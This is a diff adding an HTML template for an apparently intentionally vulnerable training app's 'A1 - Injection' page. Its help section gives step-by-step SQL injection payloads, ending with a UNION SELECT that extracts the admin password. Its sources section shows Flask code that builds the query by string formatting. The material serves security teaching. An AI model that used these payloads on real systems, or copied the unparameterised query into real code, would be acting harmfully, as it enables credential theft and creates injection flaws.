@@ -1,0 +1,108 @@
+{% extends 'base.html' %}
+
+{% block content %}
+{% if query %}
+<p>Execute query : <pre>{{ query }}</pre></p>
+{% endif %}
+<form autocomplete="off" method="POST" class="form-inline">
+    <div class="form-group mx-sm-3 mb-2">
+        <input type="text" class="form-control" name="id" placeholder="Id" value="{{id}}">
+    </div>
+    <div class="form-group mx-sm-3 mb-2">
+        <button type="submit" class="btn btn-primary mb-2">Search</button>
+    </div>
+</form>
+<table class="table table-striped">
+        <thead class="thead-dark">
+          <tr>
+            <th scope="col">ID</th>
+            <th scope="col">Name</th>
+            <th scope="col">Email</th>
+            <th scope="col">Job</th>
+          </tr>
+        </thead>
+        <tbody>
+        {% for row in result %}
+          <tr>
+            <th scope="row">{{ row['id'] }}</th>
+            <td>{{ row['name'] }}</td>
+            <td>{{ row['email'] }}</td>
+            <td>{{ row['job'] }}</td>
+          </tr>
+        {% endfor %}
+        </tbody>
+      </table>
+{% endblock %}
+
+{% block help %}
+{% filter markdown %}
+First, try to find valid users id
+
+```sql
+1
+```
+
+Then, to confirm the injection you can try to make an mathematical operation. If the operation is interpreted, the SQL Injection is confirmed.
+
+```sql
+2-1
+```
+
+Once the vulnerability is confirmed, we can extract all rows of the user table.
+
+```sql
+1 OR 1=1
+```
+We need to know where field are injected to find string columns.
+
+```SQL
+20 UNION SELECT 1,2,3,4,5,6
+```
+For SQLite, it's easy to get tables and columns information with the sqlite_master table.
+
+```sql
+20 UNION SELECT 1,2,3,sql,5,6 FROM sqlite_master
+```
+Now, we can extract the admin password
+
+```sql
+20 UNION SELECT 1,email,3,password,5,6 FROM user WHERE role="admin"
+```
+{% endfilter %}
+{% endblock %}
+
+{% block sources %}
+{% filter markdown %}
+<div class="btn-group" role="group" aria-label="Basic example">
+  <button type="button" class="btn btn-secondary" data-toggle="collapse" data-target="#collapseOne">GET /a1-injection</button>
+  <button type="button" class="btn btn-secondary" data-toggle="collapse" data-target="#collapseTwo">POST /a1-injection</button>
+</div>
+
+<div class="accordion" id="accordionExample">
+    <div class="card">
+      <div id="collapseOne" class="collapse show" aria-labelledby="headingOne" data-parent="#accordionExample">
+        <div class="card-body">
+```python
+@app.route('/a1-injection')
+def get_a1_injection():
+    return render_template("injection.html",title="A1 - Injection")
+```
+        </div>
+      </div>
+    </div>
+    <div class="card">
+      <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#accordionExample">
+        <div class="card-body">
+```python
+@app.route('/a1-injection',methods=['POST'])
+def post_a1_injection():
+    query = "SELECT * FROM user WHERE id={}".format(request.form['id'])
+    result = db.engine.execute(query)
+    return render_template("injection.html",query=query,result=result,title="A1 - Injection")
+```   
+        </div>
+      </div>
+    </div>
+  </div>
+{% endfilter %}
+{% endblock %}
